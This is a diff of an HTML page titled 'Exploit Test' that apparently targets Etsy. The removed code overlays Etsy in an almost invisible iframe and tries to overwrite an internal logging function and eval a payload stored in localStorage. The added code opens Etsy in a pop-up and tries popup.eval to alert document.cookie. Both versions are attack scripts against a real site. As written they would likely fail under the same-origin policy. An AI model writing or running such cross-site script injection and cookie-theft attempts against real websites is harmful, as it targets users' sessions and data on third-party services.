@@ -1,78 +1,33 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Loading...</title>
-    <style>
-        iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0.01; /* Invisible iframe */
-            z-index: 9999;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit Test</title>
 </head>
 <body>
-
-    <h1>Loading...</h1>
-
-    <iframe id="targetIframe" src="https://www.etsy.com" sandbox="allow-scripts allow-same-origin"></iframe>
+    <h1>Click Below to Open the Pop-up</h1>
+    <button id="exploitBtn">Launch Pop-up</button>
 
     <script>
-        console.log("[+] Window loaded, waiting for iframe...");
+        document.getElementById("exploitBtn").addEventListener("click", () => {
+            let popup = window.open("https://www.etsy.com", "EtsyPopup", "width=800,height=600");
 
-        window.onload = function() {
-            let iframe = document.getElementById("targetIframe");
+            if (popup) {
+                console.log("[+] Pop-up opened successfully. Checking access...");
 
-            console.log("[+] Iframe element found. Waiting for it to load...");
-
-            // Wait for iframe to load before executing
-            setTimeout(() => {
-                try {
-                    let iframeWindow = iframe.contentWindow;
-                    console.log("[+] Iframe has loaded. Current URL:", iframe.src);
-
-                    // Step 1: Attempt Prototype Pollution
-                    console.log("[+] Attempting Prototype Pollution...");
-                    if (iframeWindow.__etsy_logging && iframeWindow.__etsy_logging.eventpipe) {
-                        console.log("[+] Prototype Pollution target exists. Injecting...");
-
-                        iframeWindow.__etsy_logging.eventpipe.logEventImmediately = function(payload) {
-                            console.log("[+] Prototype Pollution Success! Payload Executed:", payload);
-                            alert("Prototype Pollution Success: " + payload);
-                        };
-
-                        iframeWindow.__etsy_logging.eventpipe.logEventImmediately("Injected XSS via Prototype Pollution!");
-                    } else {
-                        console.log("[!] Prototype Pollution target not found. Etsy might have changed its internal structure.");
+                setTimeout(() => {
+                    try {
+                        console.log("[+] Attempting to execute JS in pop-up...");
+                        popup.eval(`console.log("[*] Injected Script Running"); alert(document.cookie);`);
+                    } catch (err) {
+                        console.error("[!] Exploit failed:", err);
                     }
-
-                    // Step 2: Stored XSS Execution
-                    console.log("[+] Attempting Stored XSS Injection...");
-                    if (iframeWindow.localStorage) {
-                        iframeWindow.localStorage.setItem("xss_payload", "alert('XSS Triggered');");
-                        console.log("[+] XSS Payload stored in localStorage.");
-
-                        const payload = iframeWindow.localStorage.getItem("xss_payload");
-                        if (payload) {
-                            console.log("[+] XSS Payload Retrieved:", payload);
-                            iframeWindow.eval(payload);
-                            console.log("[+] XSS Payload Executed Successfully.");
-                        } else {
-                            console.log("[!] Failed to retrieve stored XSS payload.");
-                        }
-                    } else {
-                        console.log("[!] localStorage is not accessible in the iframe.");
-                    }
-
-                } catch (e) {
-                    console.log("[!] Exploit failed:", e);
-                }
-            }, 3000); // Slight delay to ensure iframe is fully loaded
-        };
+                }, 3000);
+            } else {
+                console.log("[!] Pop-up blocked. Allow pop-ups and try again.");
+            }
+        });
     </script>
-
 </body>
 </html>
